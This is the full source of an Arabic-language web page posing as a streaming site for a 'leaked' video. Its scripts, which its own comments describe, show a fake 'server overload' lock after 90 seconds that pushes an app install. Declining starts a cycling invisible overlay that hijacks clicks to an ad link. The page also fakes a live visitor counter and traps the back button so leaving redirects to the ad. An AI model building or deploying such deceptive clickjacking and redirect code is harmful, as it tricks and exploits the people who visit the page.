    <style>
        :root {
            --primary-color: #ff0000;
            --accent-color: #ffcc00;
            --bg-dark: #0a0a0a;
            --card-bg: #161616;
        }

        body { background-color: var(--bg-dark); color: #fff; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }

        /* ستارة Adsterra الشفافة */
        #invisible-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; cursor: pointer; display: none; }

        /* قفل السيرفر الاحترافي */
        #app-lock-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.96); z-index: 10001; display: none; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
        
        .lock-card { background: #111; padding: 25px; border-radius: 20px; border: 1px solid #333; max-width: 85%; text-align: center; box-shadow: 0 0 40px rgba(255, 0, 0, 0.3); }

        header { background: linear-gradient(to bottom, #1a1a1a, transparent); padding: 20px; text-align: center; border-bottom: 1px solid #222; }
        .logo { font-size: 2rem; font-weight: 900; color: var(--primary-color); text-shadow: 0 0 15px rgba(255, 0, 0, 0.5); margin: 0; }
        .sub-logo { color: var(--accent-color); font-size: 0.9rem; font-weight: bold; }

        .container { max-width: 700px; margin: 20px auto; padding: 10px; }
        .video-card { background: var(--card-bg); border-radius: 15px; margin-bottom: 30px; overflow: hidden; border: 1px solid #222; }
        .video-header { padding: 12px 15px; text-align: right; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
        .video-title { font-weight: bold; font-size: 1rem; color: #eee; }
        .quality-badge { background: var(--primary-color); padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; }
        .video-wrapper { position: relative; width: 100%; aspect-ratio: 16 / 9; background: #000; }
        video { width: 100%; height: 100%; display: block; }

        .btn-install { background: #00E676; color: #000; text-decoration: none; padding: 18px; display: block; border-radius: 50px; font-weight: 900; font-size: 1.2rem; margin-top: 20px; animation: pulse 1.5s infinite; border: none; cursor: pointer; }
        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.03); } 100% { transform: scale(1); } }
        .refuse-link { color: #555; font-size: 0.8rem; text-decoration: underline; margin-top: 15px; display: block; cursor: pointer; }

        .footer { padding: 40px 20px; text-align: center; color: #555; font-size: 0.8rem; }
        .live-indicator { display: inline-block; width: 10px; height: 10px; background: #ff0000; border-radius: 50%; margin-left: 5px; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div id="invisible-overlay" onclick="handleAdClick()"></div>

<div id="app-lock-overlay">
    <div class="lock-card">
        <div style="font-size: 2.5rem;">⚠️</div>
        <h2 style="color: var(--accent-color);">ضغط عالي على السيرفر!</h2>
        <p style="color: #eee; font-size: 0.9rem; line-height: 1.6;">
            لضمان استمرار البث بجودة 4K ومنع تعليق الموقع، يرجى الانتقال للمشاهدة عبر التطبيق الرسمي المعتمد.
        </p>
        <div style="margin: 15px 0;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" width="120">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" width="120">
        </div>
        <a href="https://vidspaceapp.onelink.me/RzWN/56gc1p3b?deep_link_value=..." class="btn-install">تحميل وفتح السيرفر الآن</a>
        <span class="refuse-link" onclick="handleRefusal()">إكمال المشاهدة هنا (سيرفر بطيء)</span>
    </div>
</div>

<header>
    <h1 class="logo">حصريات العرب</h1>
    <div class="sub-logo">سيرفرات المشاهدة المباشرة (VIP)</div>
</header>

<div class="container">
    <div class="video-card">
        <div class="video-header"><span class="video-title">🔥 التسريب الأول</span><span class="quality-badge">4K ULTRA HD</span></div>
        <div class="video-wrapper">
            <video controls playsinline poster="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlbXaFRmgk_xep_3WLybyHLmB64zDz515V60krwmCm7ZdmdctUoZX68JQHqbnFHCGmXdIt2qHALTF3cexmZwB3b5fKLXGsGljdOKqs-2tgR80JqTF9vbg8384RYjptq-TVG41mJftbQZ6DOFsCy00Tj4M1LrcOVMcL2vQXo6BRtdQagL74OfxZkpmPqpEp/s981/1000204258.jpg">
                <source src="https://media.discordapp.net/attachments/.../VID_20260216_111844.mp4..." type="video/mp4">
            </video>
        </div>
    </div>
    </div>

<div class="footer">
    <span class="live-indicator"></span> متصل الآن: <span id="online-count">4,281</span> عضو
</div>

<script>
    const adsLink = "https://www.effectivegatecpm.com/am4whsry06?key=cbec04a8dfceb0dd47c7df9691777cb5";
    const overlay = document.getElementById('invisible-overlay');
    const lock = document.getElementById('app-lock-overlay');
    let refusalMode = false;

    // تفعيل القفل بعد 90 ثانية بالضبط
    setTimeout(() => {
        lock.style.display = 'flex';
        document.querySelectorAll('video').forEach(v => v.pause());
    }, 90000);

    // بدء نظام "المطاردة" في حال الرفض
    function handleRefusal() {
        window.open(adsLink, '_blank');
        lock.style.display = 'none';
        refusalMode = true;
        activateNuisanceAds();
    }

    function activateNuisanceAds() {
        function showCycle() {
            if(!refusalMode) return;
            // هدوء عشوائي 3-6 ثوانٍ ثم إزعاج 8-12 ثانية
            const waitTime = Math.floor(Math.random() * (6000 - 3000 + 1)) + 3000;
            const activeTime = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000;

            setTimeout(() => {
                overlay.style.display = 'block';
                setTimeout(() => {
                    overlay.style.display = 'none';
                    showCycle();
                }, activeTime);
            }, waitTime);
        }
        showCycle();
    }

    function handleAdClick() {
        window.open(adsLink, '_blank');
        overlay.style.display = 'none';
    }

    // تزييف عداد الزوار لزيادة المصداقية
    setInterval(() => {
        const count = Math.floor(Math.random() * (5000 - 4000) + 4000);
        document.getElementById('online-count').innerText = count.toLocaleString();
    }, 3000);

    // منع الخروج (Back Button Trap)
    (function() {
        window.history.pushState({page: 1}, "", window.location.href);
        window.onpopstate = function() { window.location.replace(adsLink); };
    })();
</script>
</body>
</html>
